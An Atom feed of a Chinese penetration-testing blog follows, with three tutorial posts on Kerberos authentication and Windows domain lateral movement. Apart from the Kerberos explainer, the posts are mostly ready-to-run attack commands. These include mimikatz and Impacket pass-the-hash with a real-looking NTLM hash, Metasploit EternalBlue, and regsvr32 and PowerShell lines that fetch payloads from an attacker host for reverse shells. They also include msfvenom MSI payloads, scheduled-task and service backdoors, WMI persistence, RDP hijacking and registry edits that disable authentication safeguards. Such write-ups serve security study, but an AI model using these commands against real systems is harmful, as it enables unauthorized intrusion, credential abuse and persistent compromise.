<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://dydydy123.github.io</id>
    <title>he11的农场</title>
    <updated>2023-06-12T07:37:33.558Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://dydydy123.github.io"/>
    <link rel="self" href="https://dydydy123.github.io/atom.xml"/>
    <subtitle>ganma~~~~~~~~~~</subtitle>
    <logo>https://dydydy123.github.io/images/avatar.png</logo>
    <icon>https://dydydy123.github.io/favicon.ico</icon>
    <rights>All rights reserved 2023, he11的农场</rights>
    <entry>
        <title type="html"><![CDATA[内网渗透体系建设--第7章--kerberos攻击专题（kerberos认证基础）]]></title>
        <id>https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-7-zhang-kerberos-gong-ji-zhuan-ti/</id>
        <link href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-7-zhang-kerberos-gong-ji-zhuan-ti/">
        </link>
        <updated>2023-04-15T12:02:01.000Z</updated>
        <content type="html"><![CDATA[<h1 id="1kerberos认证基础">1.kerberos认证基础</h1>
<p><strong>简写名词：</strong></p>
<p>KDC（Key Distribution Center）= 密钥分发中心<br>
AS（Authentication Server）= 认证服务器<br>
TGS（Ticket Granting Server）= 票据授权服务器<br>
TGT（Ticket Granting Ticket）= 票据授权票据，票据的票据</p>
<p>流程图<br>
<img src="https://dydydy123.github.io/post-images/1681562347574.png" alt="" loading="lazy"><br>
<img src="https://dydydy123.github.io/post-images/1681616291384.png" alt="" loading="lazy"></p>
<p><strong>1.AS-REQ：</strong><br>
1.Client向AS以明文形式发起请求，请求携带，用户名，服务名，ip，时间戳等。<br>
<img src="https://dydydy123.github.io/post-images/1681710196004.png" alt="" loading="lazy"></p>
<p><strong>2.AS-REP：</strong><br>
1.AS接收请求，后去Kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可靠性。<br>
2.如果没有该用户名，认证失败，服务结束；如果存在该用户名，则AS认证中心便认为用户存在，此时便会返回给客户端，其中包含两部分内容：</p>
<pre><code>(1) 第一部分内容是使用客户端密码hash加密的一段内容，其中包括用于客户端和TGS间通信的`TGS Session Key`,客户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而中断认证流程。
(2) 第二部分内容称为TGT，它叫做票据授予票据(由`krbtgt的NTML-hash`加密)，客户端需要使用TGT去KDC中的TGS(票据授予中心)获取访问网络服务所需的Ticket(服务授予票据 TS)，TGT中包含的内容有PAC（用于验证用户权限，只有KDC能制作和查看）Kerberos数据库中存在的该客户端的Name、IP、当前时间戳、客户端即将访问的TGS的Name、TGT的有效时间以及一把用于客户端和TGS间进行通信的`TGS Session Key`。整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况。
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://dydydy123.github.io/post-images/1681710255356.png" alt="" loading="lazy"></figure>
<p><strong>3.TGS_REQ：</strong><br>
1.此时的客户端收到了来自KDC中AS的响应，并获取到了其中的两部分内容。客户端会用自己的密码hash将第一部分内容进行解密，分别获得时间戳，自己将要访问的TGS的信息，和用于与TGS通信时的密钥<code>TGS Session Key</code>。<br>
2.首先客户端会根据时间戳判断该时间戳与自己发送请求时的时间的差值是否大于5分钟，如果大于5分钟则认为该AS是伪造的，认证至此失败。如果时间戳合理，客户端便准备向TGS发起请求，其次请求的目的是为了获取能够访问目标网络服务的服务授予票据(TS)。<br>
3.客户端将携带三部分内容交给KDC中的TGS：</p>
<pre><code>(1).客户端将使用TGS密钥（krbtgt的NTML-hash）加密的TGT也原封不动的也携带给TGS；
(2).客户端将自己想要访问的Server服务以明文的方式发送给TGS；
(3).客户端使用TGS Session Key加密将自己的客户端信息发送给TGS，其中包括客户端名、IP、时间戳；
</code></pre>
<p><img src="https://dydydy123.github.io/post-images/1681710318767.png" alt="" loading="lazy"><br>
<img src="https://dydydy123.github.io/post-images/1681710621093.png" alt="" loading="lazy"></p>
<p><strong>4.TGS_REP：</strong><br>
1.此时KDC中的TGS(票据授予服务器)收到了来自客户端的请求。它首先根据客户端明文传输过来的Server服务信息，查看当前Kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束。如果存在，则继续接下来的认证。</p>
<p>2.TGS使用<code>krbtgt用户的NTML-hash</code>将TGT中的内容进行解密，此时它看到了经过AS认证过后并记录的用户信息，一把<code>TGS Session Key</code>，还有时间戳信息，他会根据时间戳判断此次通信是否真是可靠有无超出时延。</p>
<p>3.如果时延正常，则TGS会使用<code>TGS Session Key</code>对客户端的第三部分内容进行解密(使用<code>TGS Session Key</code>加密的客户端信息)，取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。</p>
<p>4.此时TGS将返回响应给客户端，响应内容包括：</p>
<pre><code>(1) 第一部分：使用TGS Session Key加密的内容，其中包括Service Session Key和时间戳，还有TGT的有效时间。由于在第一次通信的过程中，AS已将TGS Session Key通过客户端密码加密交给了客户端，且客户端解密并缓存了TGS Session Key，所以该部分内容在客户端接收到时是可以自己解密的。
(2) 第二部分：用于客户端访问网络服务使用`Server的NTML-hash`加密的ST(Server Ticket)，其中包括客户端的Name，IP，需要访问的网络服务的地址Server IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信的 Service Session Key。
</code></pre>
<p><img src="https://dydydy123.github.io/post-images/1681710668240.png" alt="" loading="lazy"><br>
<img src="https://dydydy123.github.io/post-images/1681710797661.png" alt="" loading="lazy"></p>
<p><strong>5.AP_REQ：</strong><br>
1.此时的客户端收到了来自KDC中TGS的响应，并使用缓存在本地的TGS Session Key解密了第一部分内容(第二部分内容中的ST是由Server的NTML-hash加密的，客户端无法解密)，检查时间戳无误后取出其中的Service Session Key准备向服务端发起最后的请求。<br>
2.客户端使用Service Session Key将自己的主机信息和时间戳进行加密作为交给服务端的第二部分内容，然后将ST(服务授予票据)作为第一部分内容都发送给服务端。<br>
<img src="https://dydydy123.github.io/post-images/1681710932374.png" alt="" loading="lazy"><br>
<img src="https://dydydy123.github.io/post-images/1681710999004.png" alt="" loading="lazy"></p>
<p><strong>6.AP_REP：</strong><br>
1.服务器此时收到了来自客户端的请求，它会使用自己的Server NTML-hash，将客户端第一部分内容进行解密，核对时间戳之后将其中的Service Session Key取出，使用Service Session Key将客户端发来的第二部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时它将这部分信息和客户端第一部分解密内容带来的自己的信息进行比对，最终确认该客户端就是经过KDC认证的具有真实身份的客户端，是它可以提供服务的客户端。此时服务端返回一段使用Service Session Key加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的Service Session Key解密之后也确定了服务端的身份(其实服务端在通信的过程中还会使用数字证书证明自己身份)。<br>
<img src="https://dydydy123.github.io/post-images/1681711040443.png" alt="" loading="lazy"><br>
<img src="https://dydydy123.github.io/post-images/1681711153250.png" alt="" loading="lazy"><br>
<img src="https://dydydy123.github.io/post-images/1681711175749.png" alt="" loading="lazy"><br>
<img src="https://dydydy123.github.io/post-images/1681711188578.png" alt="" loading="lazy"><br>
客户端确定了服务端的身份后将ST缓存下来<br>
<img src="https://dydydy123.github.io/post-images/1681711214920.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[内网渗透体系建设--第5章--横向移动下(哈希传递等)]]></title>
        <id>https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-5-zhang-heng-xiang-yi-dong-shang-ha-xi-chuan-di/</id>
        <link href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-5-zhang-heng-xiang-yi-dong-shang-ha-xi-chuan-di/">
        </link>
        <updated>2023-04-14T09:16:05.000Z</updated>
        <content type="html"><![CDATA[<h1 id="1哈希传递">1.哈希传递</h1>
<p>PTH攻击的工具：</p>
<pre><code>1.Mimikatz
2.Impacket
3.CrackMapExec
4.Powershell
5.Evil-Winrm
6.Metesploite
</code></pre>
<p><strong>1.1 哈希传递攻击的利用</strong><br>
pth原理：<br>
攻击者直接通过LM Hash 和 NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>
<p>如果禁用了ntlm认证，psexec无法利用获得的ntml，hash经行远程连接，但是minikatz还是可以攻击成功。对于8.1/2012r2 ,安装了kb2871997的win7/2008r2/8/2012等，可以使用AES keys代替NT hash来实现ptk攻击。</p>
<p>KB2871997补丁影响：<br>
pth：没打补丁所有用户都可以连接，打了补丁只有administrator可连接。<br>
ptk：打了补丁可使用，所有用户都可连接，通过aes256连接。<br>
具体：https://www.freebuf.com/column/220740.html</p>
<p><code>1.利用mimikatz进行PTH</code></p>
<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit #抓取用户哈希
 
#横向返回一个与域中所有符合要求的目标进行连接后的cmd
mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:god.org /ntlm:b93c17875ad053ce97c3063a6a02c15e&quot;
</code></pre>
<p><code>2.利用Impacket 进行PTH</code><br>
可使用pyinstaller打包成exe文件(此外还可以使用psexec.py, wmiexec.py进行PTH横向)</p>
<pre><code>python smbexec.py -hashes ::b93c17875ad053ce97c3063a6a02c15e god.org/administrator@192.168.52.141
</code></pre>
<p><strong>1.2 利用PTH登录远程桌面</strong><br>
条件:</p>
<pre><code>远程主机开启受限管理员模式
用于远程桌面的用户位于远程主机的管理员组中(受限管理员模式只对管理员组用户有效,如果获取哈希的用户属于远程桌面用户组就无法进行哈希传递攻击)
拿到远程主机上能够登录的用户的哈希
WinServer2012 R2开始采用新版RDP, 支持受限管理员模式, 在该模式下才可以使用哈希进行哈希传递登录而不需要输入密码(在Win8.1和WinServer2012 R2上默认开启)
</code></pre>
<p>没有开启受限管理员的主机可以通过下面命令开启:</p>
<pre><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
</code></pre>
<p>步骤：<br>
<code>1.查看主机受限模式开启状态:</code></p>
<pre><code>reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin    #输出为0则已启动,为1则未启动
</code></pre>
<p><code>2.远程主机开启受限管理员模式的话就可以通过Mimikatz进行攻击：</code></p>
<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:h0cksr.bxs /ntlm: \&quot;/run:mstsc.exe /restrictedadmin\&quot;&quot;
 
mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:god.org /ntlm:b93c17875ad053ce97c3063a6a02c15e \&quot;/run:mstsc.exe /restrictedadmin\&quot;&quot;
</code></pre>
<h1 id="2-ehernalblue永恒之蓝">2 EhernalBlue(永恒之蓝)</h1>
<p>永恒之蓝的原理不再多说了, 主要就是Windows SMB v1服务器错误处理来自远程的特制数据包从而产生漏洞, 测试的时候如果发现有445端口开启可以流程化走一下看看有没有漏洞</p>
<p>此外类似原理的还有SM08-067, CVE-2019-0807等均可用于横向</p>
<pre><code>msfconsole
use auxiliary/scanner/smb/smb_ms17_010  #这个只是检测模块,用于检查是否存在漏洞
set rhosts 192.168.30.1/24
set threads 10
run
 
use exploit/windows/smb/ms17_010_eternalblue
set payload payload/windows/x64/meterpreter/reverse_tcp
set rhosts 192.168.92.198
set lhost 192.168.92.128
set lport 444
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[内网渗透体系建设--第5章--横向移动上(基础知识)]]></title>
        <id>https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-5-zhang-heng-xiang-yi-dong/</id>
        <link href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-5-zhang-heng-xiang-yi-dong/">
        </link>
        <updated>2023-04-13T04:03:16.000Z</updated>
        <content type="html"><![CDATA[<h1 id="1-横向移动中的文件传输">1 横向移动中的文件传输</h1>
<p><strong>1.1 通过网络共享：</strong></p>
<pre><code>net share 获取系统默认开启的网络共享
</code></pre>
<p>C<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">：</mi><mi>C</mi><mi mathvariant="normal">盘</mi><mi mathvariant="normal">共</mi><mi mathvariant="normal">享</mi><mi mathvariant="normal">。</mi><mi>A</mi><mi>D</mi><mi>M</mi><mi>I</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">：C盘共享。
ADMIN</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">：</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord cjk_fallback">盘</span><span class="mord cjk_fallback">共</span><span class="mord cjk_fallback">享</span><span class="mord cjk_fallback">。</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span></span></span></span>：系统目录共享。<br>
IPC$：“命名管道”资源共享。</p>
<p><code>其中主要值得我们注意的是IPC$共享：</code><br>
IPC是共享命名管道的资源, 为了进程间通信而开放的命名管道, 通过提供的用户名和口令, 连接双方可以建立安全的通道并在这个通道内进行加密数据交换, 从而实现对远程计算机的远程访问。</p>
<p>通过建立IPC$连接, 不仅可以进行文件共享操作, 还可以实现其他远程管理操作, 如列出远程主机进程, 在远程主机上创建计划任务, 在远程主机上创建系统服务。</p>
<p><code>建立IPC$连接的条件:</code><br>
远程主机开启IPC$连接<br>
远程主机开放139或445端口</p>
<pre><code>net use \\192.168.52.138\IPC$ &quot;Qwer123&quot; /user:&quot;liukaifeng01&quot;   # 连接远程主机(DC)的IPC
#net use \\&lt;IP&gt;\IPC$&lt;password&gt; /user:&lt;username&gt;
 
dir \\192.168.52.138\C$  #列出远程主机的C盘共享目录

copy shell.exe \\192.168.52.138\C$   #复制exp到目标计算机


</code></pre>
<p><strong>1.2 搭建SMB服务器：</strong><br>
https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BC%80%E5%90%AFWindows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E5%85%B1%E4%BA%AB</p>
<pre><code>Set-ExecutionPolicy RemoteSigned

Import-Module C:\Users\liukaifeng01\Desktop\Invoke-BuildAnonymousSMBServer.ps1
#导入模块

Get-Command
#查看模块 

Invoke-BuildAnonymousSMBServer -Path c:\ -Mode Enable #开启
Invoke-BuildAnonymousSMBServer -Path c:\ -Mode Disable #关闭

需建立IPC连接
dir \\192.138.52.138\smb

</code></pre>
<p><strong>1.3 windows自带工具：</strong><br>
1.Certutil：</p>
<pre><code>certutil -urlcache -split -f http://192.168.52.138:80/1.png C:\1.png

</code></pre>
<p>2.BITSAdmin：</p>
<pre><code>bitsadmin /transfer test http://192.168.52.138:80/1.png C:\2.png
</code></pre>
<p>3.Powershell：<br>
WebClient对象实现文件下载：</p>
<pre><code>powershell.exe -exec bypass -Command &quot;(New-Object New Net.WebClient).DownloadFile('http://192.168.52.138:80/1.png','C:\3.png')&quot;

</code></pre>
<h1 id="2创建计划任务">2.创建计划任务</h1>
<p><strong>2.1常规流程</strong><br>
利用已建立的IPC连接上传payload。<br>
利用已建立的IPC连接或指定用户凭据的方式在远程主机上创建计划任务。</p>
<pre><code>1.建立连接
net use \\&lt;IP&gt;\IPC$ &lt;password&gt; /user:&lt;username&gt;   # 和目标主机建立IPC连接
 
schtasks /Create /S &lt;TargetIP&gt; /TN 任务名 /SC minute /MO 1 /TR &lt;PayloadPath&gt; /RU System /F    #在目标主机添加计划任务
# /S  指定要连接的系统
# /TN 指定要创建的计划任务名称
# /SC 指定计划任务执行频率
# /MO 指定计划任务周期
# /TR 指定计划任务运行的程序路径
# /RU 指定计划任务运行的用户权限
# /F  如果指定的任务已存在,则强制执行
schtasks /RUN /S 192.168.52.138 /I /TN Backdoor   #立即启动计划任务
schtasks /Delete /S &lt;TargetIP&gt; /TN Backdoor /F    #删除计划任务
 
#建立连接
net use \\192.168.52.138\IPC$ &quot;Qwer123&quot; /user:&quot;liukaifeng01&quot;
#执行命令
schtasks /Create /S 192.168.52.138 /TN Backdoor /SC minute /MO 1 /TR &quot;C:\Windows\System32\cmd.exe /c 'whoami &gt; C:\222.txt '&quot; /RU System /F
#查看命令执行结果
type \\192.168.52.138\c$\222.txt

#建立反向连接
schtasks /Create /S 192.168.52.138 /TN Backdoor /SC minute /MO 1 /TR C:\shell.exe /RU System /F

copy C:\shell.exe \\192.168.30.10\C$\shell.exe

2.未建立连接需要指定凭证：
schtasks /Create /S &lt;TargetIP&gt; /TN 任务名 /SC minute /MO 1 /TR &lt;PayloadPath&gt; /RU System /F /U username /P password 
</code></pre>
<p><strong>2.2 UNC路径加载执行</strong></p>
<pre><code>schtasks /Create /S &lt;TargetIP&gt; /TN Backdoor /SC minute /MO 1 /TR \\&lt;SMBServerIP&gt;\&lt;SMBServerName&gt;\&lt;PayloadPath&gt; /RU System /F  /U &quot;&lt;SMBUsername&gt;&quot; /P &quot;&lt;SMBPassword&gt;&quot; 
#在目标主机添加计划任务并直接指定UNC路径和smb服务登录凭据

schtasks /Create /S 192.168.52.138 /TN Backdoor /SC minute /MO 1 /TR \\192.168.52.138\smb\shell.exe /RU System /F  /U &quot;&lt;SMBUsername&gt;&quot; /P &quot;&lt;SMBPassword&gt;&quot; 

schtasks /RUN /S 192.168.52.138 /I /TN Backdoor

</code></pre>
<p><img src="https://dydydy123.github.io/post-images/1681373863276.png" alt="" loading="lazy"><br>
<img src="https://dydydy123.github.io/post-images/1681373925621.png" alt="" loading="lazy"></p>
<h1 id="3-利用系统服务">3 利用系统服务</h1>
<p><strong>3.1 创建远程服务</strong></p>
<pre><code>net use \\192.168.52.138\IPC$ &quot;Qwer123&quot; /user:&quot;liukaifeng01&quot;

sc \\&lt;TargetIP&gt; create &lt;ServerName&gt; binpath= &quot;cmd.exe /k &lt;PayloadPath&gt;&quot; #创建远程服务
 
sc \\&lt;TargetIP&gt; start &lt;ServerName&gt;  #开启服务
 
sc \\&lt;TargetIP&gt; delete &lt;ServerName&gt; #删除服务

sc \\192.168.52.138 create name binpath= &quot;C:\Windows\System32\cmd.exe /k C:\shell.exe&quot;
sc \\192.168.52.138 create name binpath= &quot;C:\Windows\System32\cmd.exe /c  whoami &gt; C:\123.txt&quot;
sc \\192.168.52.138 start name  #开启服务
sc \\192.168.52.138 delete name
</code></pre>
<p><strong>3.2 SCShell</strong></p>
<pre><code>SCShell.exe 192.168.30.10 XblAuthManager &quot;C:\Windows\System32\cmd.exe /c calc&quot; &quot;h0cksr.bxs&quot; &quot;administrator&quot; &quot;adminDC#@123&quot;
# SCShell.exe &lt;TargetIP&gt; &lt;ServiceName&gt; &lt;PayloadPath&gt; &lt;Domain&gt; &lt;Username&gt; &lt;Password&gt;
 
#msf生成一个攻击服务
msfconsole
use exploit/multi/script/web_delivery
set payload payload/windows/x64/meterpreter/reverse_tcp
set lhost 192.168.52.132    #msf服务ip
set lport 4444  #msf监听反弹shell端口
set target Regsvr32
run #运行后任务会自动转到后台, 可以通过jobs查看
 
#靶机上执行下面命令加载msf指定的payload后会反弹shell
regsvr32 /s /n /u /i:http://192.168.92.128:8080/gDvWiNXOAjC.sct scrobj.dll
 
#指定远程服务执行命令
SCShell.exe 192.168.52.138 XblAuthManager &quot;C:\Windows\System32\cmd.exe /c C:\Windows\System32\regsvr32.exe /s /n /u /i:http://192.168.52.132:8080/6R5aLR1tX56N.sct scrobj.dll&quot; god.org liukaifeng01 Qwer123
</code></pre>
<p><strong>3.3 UACRemote Restrictions(远程限制)</strong><br>
简单说就是微软在Windows Vista之后为了更好管理和保护本地管理员组成员的用户, 引入了远程限制, 此机制有助于防止本地恶意软件以管理员权限远程执行(被通过远程的方式调用), 所以只允许RID 500(administrator)这个本地管理员组用户, 其他的用户均会拒绝访问(域管理员用户不受限)。</p>
<p>Psexec、WMI、WinRM、PTH哈希传递都只能使用RID 500(administrator)本地管理员用户。</p>
<p>可以通过执行下面命令后重启系统来关闭远程限制</p>
<pre><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
</code></pre>
<h1 id="4远程桌面应用">4.远程桌面应用</h1>
<p><strong>4.1远程桌面的确定与开启：</strong></p>
<pre><code>reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections   # 查询是否已开启远程桌面,显示0x0则已开启,0x1表示未开启
 
reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f    # 开启远程桌面连接
 
reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0   #关闭&quot;仅允许运行使用网络级别身份验证的远程桌面的计算机连接&quot;(鉴权)
 
netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow # 设置防火墙放行3389端口
</code></pre>
<p>对于远程主机：</p>
<pre><code>wmic /Node:192.168.52.138 /User:liukaifeng01 /Password:Qwer123 RDTOGGLE WHERE ServerName='owa' call SetAllowTSConnections 1
</code></pre>
<p><strong>4.2 RDP Hijacking</strong><br>
如果已获得靶机SYSTEM权限就可以劫持其他用户的RDP会话, 在未授权情况下登入目标系统(即使该用户的会话已断开), 这种攻击方法就是RDP Hijacking(桌面劫持)</p>
<p>tscon命令提供切换用户会话的功能, 正常情况下切换用户会话就需要提供切换目标的登录密码, 但是SYSTEM就绕过了这个验证的步骤.</p>
<p>所以攻击步骤如下:</p>
<p>登录一个一般权限用户的RDP<br>
使用工具提权为SYSTEM<br>
执行query user查看主机会话记录<br>
SYSTEM权限执行tscon <ID>切换到另一个用户的RDP会话</p>
<pre><code>query user     #查看主机会话记录
tscon &lt;ID&gt;    #SYSTEM绕过身份验证直接切换其他用户切换会话
</code></pre>
<p><strong>4.3 SharpRDP</strong><br>
https://github.com/0xthirteen/SharpRDP<br>
不需要代理即可使用用户凭证进行远程桌面命令执行。</p>
<h1 id="5-psexec-远程控制">5 PsExec 远程控制</h1>
<p>PsExec(https://learn.microsoft.com/zh-cn/sysinternals/downloads/psex ec)是微软官方提供的Windows远程控制工具, 可以根据凭据在远程系统上执行管理操作, 工具使用原理如下(和SCShell差不多):</p>
<p><code>通过SMB连接到Admin$共享</code><br>
<code>释放psexesvc.exe二进制文件</code><br>
<code>注册一个PSEXESVC服务</code><br>
<code>客户端执行命令时, PSEXESVC服务启动响应进程执行命令并回显结果</code><br>
<code>运行结束后将PSEXESVC服务删除</code></p>
<p>使用条件:</p>
<p><code>1.远程主机开启Admin$共享</code><br>
<code>2.远程主机关闭防火墙/放行445端口</code></p>
<pre><code>PsExec.exe -accepteula \\&lt;TargetIP&gt; -u &lt;SubDomain&gt;\&lt;Username&gt; -p &quot;&lt;Password&gt;&quot; -s cmd.exe
# -accepteula 禁止弹出许可对话框
# -u 指定远程用户主机名
# -p 指定用户密码
# -s 以SYSTEM权限,未指定的话就是以管理员权限运行
 
PsExec.exe -accepteula \\&lt;TargetIP&gt; cmd.exe   #如果之前已经通过net use建立了IPC连接就不需要指定账号密码了
</code></pre>
<h1 id="6-wmi-的利用">6 WMI 的利用</h1>
<p>WMI(Windows Management Instrumentation,Windwos 管理规范)是一项核心的Windows管理技术, 用户可以通过WMI管理本地和远程计算机。Windows为远程传输WMI数据提供了两个可用协议, 即为DCOM(分布式对象组件模型), 和WinRM(Windows远程管理), 使得WMI对象的查询、事件注册、WMI类方法执行和类创建操作都能远程执行。</p>
<p>在远程主机上创建进程(Win32_Process类的Create方法)<br>
在远程主机安装恶意msi(Win32_Product类的Install方法)<br>
远程部署WMI订阅事件<br>
WMI横向条件:</p>
<p>远程主机的WMI服务为开启状态(默认开启)<br>
远程主机防火墙关闭/放行135端口(WMI管理的默认端口)</p>
<p><strong>6.1 常规利用方法</strong><br>
<code>1.执行远程查询</code></p>
<pre><code>wmic /node:192.168.52.138 /user:user /password:passwd process list brief   #查询远程主机的进程信息
</code></pre>
<p><code>2.创建远程进程</code></p>
<pre><code>wmic /node: /user: /password: process create &quot;cmd.exe /c ipconfig &gt; C:\1.txt&quot;    #远程主机上创建新进程
</code></pre>
<p><code>3.远程安装MSI文件</code></p>
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.92.130 LPORT=80 -f msi -o reverse_http_80.msi 
#生成msi的paylaod
 
python3 msbserver.py evilsmb pwd -smb2support   
 #在kali开启一个smb服务使paylaod被访问到
 
wmic /node:192.168.52.138 /user:user /password:passwd product call install PackageLocation=&quot;\\IP\evilsmb\reverse_http_80.msi&quot; 
#靶机远程获取kali的smb服务中的payload进行加载
</code></pre>
<p><strong>6.2 常见利用工具</strong><br>
<code>1.wmiexec</code><br>
Impacket项目的wmiexec.py能够以全交互或半交互的方式通过WMI在远程主机执行命令, 条件是需要远程主机开放135和445端口, 这两个端口分别用于WMI管理执行命令(135)和将命令执行结果返回或搭建交互管道(445)</p>
<pre><code>python3 wmiexec.py H0CKSR/Administrator:adminDC#\@123@192.168.30.10  
#从远程主机获取交互式的shell
python3 wmiexec.py &lt;domain&gt;/&lt;username&gt;:&lt;passwd&gt;@&lt;IP&gt;
wmiexec.exe &lt;domain&gt;/&lt;username&gt;:&lt;passwd&gt;@&lt;IP&gt;
</code></pre>
<p><code>2.Invoke-WMICommand</code><br>
Invoke-WMICommand.ps1是PowerSploite项目中的一个脚本可以通过powersehll调用wmi执行命令(Powershell内置的Invoke-WMIMethod也可以远程执行命令或程序), 但是没有执行结果的回显</p>
<pre><code>IEX(New-Object Net.Webclient).DownloadString('http://IP:PORT/Invoke-WMICommand.ps1') 
#加载远程脚本
User = 'H0CKSR\Administrator' 
#指定远程系统用户名
Password = ConvertTo-SecureString -String 'adminDC#@123' -AsPlainText -Force    #指定用户密码
Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentListUser,Password 
#将用户名和密码整合以便导入
CredentialRemote = Invoke-WmiCommand -Payload {ipconfig} -Credential Cred -ComputerName '192.168.30.10'  
#指定远程主机IP和要执行的命令
Remote.PayloadOutput    
#执行命令并输出结果
整合一下到一句话里面就是:
powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.Webclient).DownloadString('http://IP:PORT/Invoke-WMICommand.ps1');User = 'H0CKSR\Administrator';Password = ConvertTo-SecureString-String 'adminDC#@123' -AsPlainText -Force;Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentListUser,Password;Remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName '';$Remote.PayloadOutput&quot;
</code></pre>
<p><strong>6.3 WMI 事件订阅的利用</strong><br>
触发事件的具体条件 — 事件过滤器<br>
对指定事件做出响应 — 事件消费者</p>
<p>所有的事件过滤器都被存储为一个ROOT\subscription:__EventFilter对象的实例, 并在特定事件发生时执行任意代码或系统命令。</p>
<p>使用WMI事件消费类的ActiveScriptEventConsumer和CommandLineEventConsumer, 可以在远程主机上执行任何攻击payload。</p>
<p>该技术既可以用于持久化也可以用于横向移动, 且需要提供远程主机的管理员权限的用户凭据。</p>
<p><code>1.手动利用：</code><br>
1整合PSCredential用于后续过程验证<br>
2设置攻击目标和其它公共参数<br>
3在远程主机上部署事件过滤器<br>
4部署事件消费者<br>
5将创建的过滤器和事件消费者绑定在一起</p>
<p><code>2.Sharp-WMIEvent</code><br>
开启SMB服务共享放置payload<br>
跳板机上使用Sharp-WMIEvent即可创建一个随机命名的永久事件订阅,每隔60s执行一个smb的payload</p>
<pre><code>Set-ExecutionPolicy RemoteSigned

Import-Module Sharp-WMIEvent.spl

Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -ComputerName &lt;tagertIP&gt; -Domain god.org -Username Administrator -Password passwd -Command &quot;cmd.exe /c \\smbIP\evilsmb\reverse_tcp.exe&quot; 
#本机添加订阅事件(用于维权)
 

Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -ComputerName 192.168.52.138 -Domain god.org -Username liukaifeng01 -Password Qwer123 -Command &quot;cmd.exe /c \\smbIP\evilsmb\reverse_tcp.exe&quot; 
</code></pre>
<h1 id="7-dcom的利用">7 DCOM的利用</h1>
<p><strong>7.1 COM和DCOM</strong><br>
<code>COM(组件对象模型)</code><br>
COM由一组构造规范和组件对象组成。COM组件对象通过接口描述自身，组件提供的服务都通过接口公开。接口就是一组函数指针表。每个指针初始化指向某个具体的函数体，一个组件对象实现的接口数量没有限制。COM指定了一个对象模型和编程要求，使COM对象能够与其他对象交互(交互的不同对象可以跨进程和跨主机)</p>
<p><code>CLSID</code><br>
在前面potato提权部分有说到寻找可用的COM对象，指定COM对象的方式就是指定COM对象的CLSID，这个CLSID是什么呢？</p>
<p>Windows中每个COM对象都由一个128位二进制标识符标识（GUID）</p>
<p>当GUID用于标识COM对象的时候就称为CLSID（类标识符）<br>
当GUID用于标识接口时称为IID（接口标识符）<br>
一些CLSID还有ProgID方便记忆</p>
